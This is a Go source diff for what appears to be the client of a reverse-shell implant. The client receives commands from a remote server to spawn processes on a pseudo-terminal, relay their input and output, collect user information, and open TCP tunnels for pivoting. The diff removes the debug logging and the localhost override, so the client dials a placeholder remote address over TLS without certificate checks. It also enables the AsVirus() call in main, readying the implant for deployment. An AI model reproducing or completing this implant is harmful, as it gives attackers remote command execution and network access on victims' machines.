@@ -92,12 +92,10 @@ func handleConnection(c *Client) {
 		backoff.Reset()
 		switch msg.Type {
 		case message.STDIO:
-			log.Debug("case message.STDIO")
 			if termiteProcess, exists := processes[msg.Body.(*message.BodyStdio).Key]; exists {
 				termiteProcess.ptmx.Write(msg.Body.(*message.BodyStdio).Data)
 			}
 		case message.WINDOW_SIZE:
-			log.Debug("case message.WINDOW_SIZE")
 			serverWindowSize := &pty.Winsize{
 				Cols: uint16(msg.Body.(*message.BodyWindowSize).Columns),
 				Rows: uint16(msg.Body.(*message.BodyWindowSize).Rows),
@@ -109,7 +107,6 @@ func handleConnection(c *Client) {
 				pty.Setsize(termiteProcess.ptmx, serverWindowSize)
 			}
 		case message.PROCESS_START:
-			log.Debug("case message.PROCESS_START")
 			bodyStartProcess := msg.Body.(*message.BodyStartProcess)
 			if bodyStartProcess.Path == "" {
 				continue
@@ -222,11 +219,8 @@ func handleConnection(c *Client) {
 				delete(processes, bodyStartProcess.Key)
 			}()
 		case message.PROCESS_STARTED:
-			log.Debug("case message.PROCESS_STARTED")
 		case message.PROCESS_STOPED:
-			log.Debug("case message.PROCESS_STOPED")
 		case message.GET_CLIENT_INFO:
-			log.Debug("case message.GET_CLIENT_INFO")
 			// User Information
 			userInfo, err := user.Current()
 			var username string
@@ -270,12 +264,10 @@ func handleConnection(c *Client) {
 				return
 			}
 		case message.DUPLICATED_CLIENT:
-			log.Debug("case message.DUPLICATED_CLIENT")
 			backoff.Current = oldBackoffCurrent
 			log.Error("Duplicated connection")
 			os.Exit(0)
 		case message.PROCESS_TERMINATE:
-			log.Debug("case message.PROCESS_TERMINATE")
 			key := msg.Body.(*message.BodyTerminateProcess).Key
 			log.Success("Request terminate %s", key)
 			if termiteProcess, exists := processes[key]; exists {
@@ -283,7 +275,6 @@ func handleConnection(c *Client) {
 				termiteProcess.ptmx.Close()
 			}
 		case message.PULL_TUNNEL_CONNECT:
-			log.Debug("case message.PULL_TUNNEL_CONNECT")
 			address := msg.Body.(*message.BodyPullTunnelConnect).Address
 			token := msg.Body.(*message.BodyPullTunnelConnect).Token
 
@@ -339,7 +330,6 @@ func handleConnection(c *Client) {
 				}
 			}
 		case message.PULL_TUNNEL_DATA:
-			log.Debug("case message.PULL_TUNNEL_DATA")
 			token := msg.Body.(*message.BodyPullTunnelData).Token
 			data := msg.Body.(*message.BodyPullTunnelData).Data
 			if conn, exists := pullTunnels[token]; exists {
@@ -351,7 +341,6 @@ func handleConnection(c *Client) {
 				log.Error("No such tunnel")
 			}
 		case message.PULL_TUNNEL_DISCONNECT:
-			log.Debug("case message.PULL_TUNNEL_DISCONNECT")
 			token := msg.Body.(*message.BodyPullTunnelDisconnect).Token
 			if conn, exists := pullTunnels[token]; exists {
 				log.Info("Closing conntion: %s", (*conn).RemoteAddr().String())
@@ -367,7 +356,6 @@ func handleConnection(c *Client) {
 				log.Error("No such tunnel")
 			}
 		case message.PUSH_TUNNEL_CREATE:
-			log.Debug("case message.PUSH_TUNNEL_CREATE")
 			address := msg.Body.(*message.BodyPushTunnelCreate).Address
 			token := msg.Body.(*message.BodyPushTunnelCreate).Token
 			server, err := net.Listen("tcp", address)
@@ -390,10 +378,7 @@ func handleConnection(c *Client) {
 				go func() {
 					for {
 						conn, err := server.Accept()
-						if err != nil {
-							// TODO: error handling
-							continue
-						} else {
+						if err == nil {
 							c.Encoder.Encode(message.Message{
 								Type: message.PUSH_TUNNEL_CONNECT,
 								Body: message.BodyPushTunnelConnect{
@@ -406,7 +391,6 @@ func handleConnection(c *Client) {
 				}()
 			}
 		case message.PUSH_TUNNEL_CONNECTED:
-			log.Debug("case message.PUSH_TUNNEL_CONNECTED")
 			token := msg.Body.(*message.BodyPushTunnelConnected).Token
 			if conn, exists := pushTunnels[token]; exists {
 				go func() {
@@ -439,7 +423,6 @@ func handleConnection(c *Client) {
 				log.Error("No such tunnel")
 			}
 		case message.PUSH_TUNNEL_DISCONNECTED:
-			log.Debug("case message.PUSH_TUNNEL_DISCONNECTED")
 			token := msg.Body.(*message.BodyPushTunnelDisonnected).Token
 			if conn, exists := pushTunnels[token]; exists {
 				(*conn).Close()
@@ -448,7 +431,6 @@ func handleConnection(c *Client) {
 				log.Error("No such tunnel")
 			}
 		case message.PUSH_TUNNEL_CONNECT_FAILED:
-			log.Debug("case message.PUSH_TUNNEL_CONNECT_FAILED")
 			token := msg.Body.(*message.BodyPushTunnelConnectFailed).Token
 			if conn, exists := pushTunnels[token]; exists {
 				(*conn).Close()
@@ -457,7 +439,6 @@ func handleConnection(c *Client) {
 				log.Error("No such tunnel")
 			}
 		case message.PUSH_TUNNEL_DATA:
-			log.Debug("case message.PUSH_TUNNEL_DATA")
 			token := msg.Body.(*message.BodyPushTunnelData).Token
 			data := msg.Body.(*message.BodyPushTunnelData).Data
 			if conn, exists := pushTunnels[token]; exists {
@@ -490,7 +471,6 @@ func StartClient() bool {
 
 	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
 	service := strings.Trim("xxx.xxx.xxx.xxx:xxxxx", " ")
-	service = "127.0.0.1:13337"
 	if hash.MD5(service) != "4d1bf9fd5962f16f6b4b53a387a6d852" {
 		log.Debug("Connecting to: %s", service)
 		conn, err := tls.Dial("tcp", service, &config)
@@ -547,7 +527,7 @@ func AsVirus() {
 }
 
 func main() {
-	// AsVirus()
+	AsVirus()
 	message.RegisterGob()
 	backoff = CreateBackOff()
 	processes = map[string]*TermiteProcess{}
